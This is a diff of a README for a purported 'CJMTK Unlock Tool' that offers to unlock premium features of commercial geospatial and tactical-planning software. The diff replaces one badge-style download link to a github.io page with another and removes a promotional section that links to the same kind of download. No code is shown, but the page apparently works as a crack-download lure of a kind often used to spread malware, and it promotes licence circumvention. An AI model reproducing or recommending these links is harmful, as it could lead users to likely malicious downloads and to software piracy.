@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ CJMTK Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://cjmtk-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20CJMTK%20Unlock%20Tool-Enable%20All%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download CJMTK Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://reeceyangizlx.github.io/.github/cjmtk-tool)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -91,13 +86,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.  
-
----
-
-## ⭐ Unlock CJMTK – Geospatial Mapping & Tactical Planning
-
-Unlock all CJMTK premium features including **drone mission planning, 3D terrain visualization, and enterprise geospatial intelligence**.  
-[Download the Unlock Tool](https://cjmtk-free-download.github.io/.github/) and enhance your operational capabilities today.  
 
 ---
 
